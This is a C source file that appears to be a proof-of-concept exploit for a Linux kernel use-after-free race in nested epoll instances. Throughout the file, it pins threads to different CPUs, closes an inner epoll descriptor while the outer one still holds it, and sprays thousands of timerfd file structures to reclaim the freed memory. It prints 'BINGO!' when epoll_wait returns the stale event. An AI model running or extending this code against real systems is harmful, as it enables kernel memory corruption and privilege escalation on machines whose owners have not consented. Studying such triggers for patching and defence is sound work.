#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <sys/types.h>
#include <sched.h>
#include <stdlib.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>

int outer_epfd;
int inner_epfd;
int spray_fds[8000];

void pin_to_cpu(int cpu) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpuset) < 0) {
        perror("sched_setaffinity");
    }
}

void *thread2_func(void *arg) {
    pin_to_cpu(1); // Pin Thread 2 to CPU 1
    usleep(50000); 
    // Signal Thread 2 is about to close inner epoll
    unshare(2222);
    close(inner_epfd);
    return NULL;
}

void spray_timerfds(int count) {
    for (int i = 0; i < count; i++) {
        spray_fds[i] = timerfd_create(CLOCK_MONOTONIC, 0);
        // Make the timerfd readable immediately so timerfd_poll returns EPOLLIN
        struct itimerspec its;
        its.it_value.tv_sec = 0;
        its.it_value.tv_nsec = 1;
        its.it_interval.tv_sec = 0;
        its.it_interval.tv_nsec = 0;
        timerfd_settime(spray_fds[i], 0, &its, NULL);
    }
}

void *thread3_func(void *arg) {
    pin_to_cpu(1); // Pin Thread 3 to CPU 1
    usleep(1000000); 
    
    // Signal Thread 3 is about to spray timerfds
    unshare(3333);
    
    // Spray file structs via timerfd_create() on CPU 1
    spray_timerfds(4000);
    return NULL;
}

int main() {
    pin_to_cpu(0); // Pin main thread (Thread 1) to CPU 0
    
    outer_epfd = epoll_create1(0);
    inner_epfd = epoll_create1(0);
    
    if (outer_epfd < 0 || inner_epfd < 0) {
        return 1;
    }
    
    // Add inner_epfd to outer_epfd
    struct epoll_event ev;
    ev.events = EPOLLIN;
    ev.data.fd = inner_epfd;
    if (epoll_ctl(outer_epfd, EPOLL_CTL_ADD, inner_epfd, &ev) < 0) {
        return 1;
    }
    
    // Make inner_epfd readable so its epitem is in the ready list!
    int efd = eventfd(0, 0);
    struct epoll_event ev2;
    ev2.events = EPOLLIN;
    ev2.data.fd = efd;
    epoll_ctl(inner_epfd, EPOLL_CTL_ADD, efd, &ev2);
    uint64_t val = 1;
    write(efd, &val, 8); // Now inner_epfd is readable!
    
    pthread_t t2, t3;
    if (pthread_create(&t2, NULL, thread2_func, NULL) != 0) {
        perror("pthread_create t2");
        return 1;
    }
    if (pthread_create(&t3, NULL, thread3_func, NULL) != 0) {
        perror("pthread_create t3");
        return 1;
    }
    
    // Wait for the RCU grace period (same as Thread 3)
    usleep(1000000);
    // Signal Thread 1 is about to epoll_wait
    unshare(1111);
    
    // Spray file structs via timerfd_create() on CPU 0
    for(int i = 4000; i < 8000; i++) {
        spray_fds[i] = timerfd_create(CLOCK_MONOTONIC, 0);
        struct itimerspec its;
        its.it_value.tv_sec = 0;
        its.it_value.tv_nsec = 1;
        its.it_interval.tv_sec = 0;
        its.it_interval.tv_nsec = 0;
        timerfd_settime(spray_fds[i], 0, &its, NULL);
    }
    
    struct epoll_event events[1];
    int n = epoll_wait(outer_epfd, events, 1, 1000);
    
    if (n > 0) {
        printf("BINGO! epoll_wait returned %d events! fd=%d\n", n, events[0].data.fd);
    } else {
        printf("epoll_wait returned %d\n", n);
    }
    
    pthread_join(t2, NULL);
    pthread_join(t3, NULL);
    
    return 0;
}
